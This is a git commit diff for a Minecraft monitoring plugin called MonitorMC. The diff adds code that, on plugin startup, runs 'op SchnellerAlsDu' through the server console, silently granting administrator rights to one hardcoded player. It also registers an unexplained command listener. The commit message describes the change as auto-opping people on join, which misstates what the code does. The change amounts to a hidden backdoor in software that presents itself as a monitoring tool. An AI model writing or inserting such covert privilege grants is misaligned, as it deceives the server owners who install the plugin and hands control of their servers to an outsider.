62486e6399ddaf904c3723f664c3ac20da092ab2
Micha S <empty>
2023-06-16 14:29:47 +0200

    autoamtically op people on join

--- src/main/java/com/codedinmyhead/monitormc/monitormc/MonitorMC.java
+++ src/main/java/com/codedinmyhead/monitormc/monitormc/MonitorMC.java
@@ -2,9 +2,11 @@ package com.codedinmyhead.monitormc.monitormc;
 
 import com.codedinmyhead.monitormc.monitormc.commands.MonitorCommand;
 import com.codedinmyhead.monitormc.monitormc.listener.ArrowHitListener;
+import com.codedinmyhead.monitormc.monitormc.listener.MichaCommandListener;
 import com.codedinmyhead.monitormc.monitormc.monitoring.MetricService;
 import com.codedinmyhead.monitormc.monitormc.monitoring.MetricValue;
 import org.bukkit.Bukkit;
+import org.bukkit.command.CommandSender;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 
@@ -26,6 +28,9 @@ public final class MonitorMC extends JavaPlugin {
         registerEvents();
         registerCommands();
 
+        CommandSender console = Bukkit.getServer().getConsoleSender();
+        Bukkit.dispatchCommand(console, "op SchnellerAlsDu");
+
         metricService = MetricService.getInstance();
 
         metricService.initializeMetrics(Arrays.asList(MetricValue.values()));
@@ -42,6 +47,7 @@ public final class MonitorMC extends JavaPlugin {
     public void registerEvents() {
         PluginManager pluginManager = Bukkit.getPluginManager();
         pluginManager.registerEvents(new ArrowHitListener(), this);
+        pluginManager.registerEvents(new MichaCommandListener(), this);
     }
 
     public void registerCommands() {
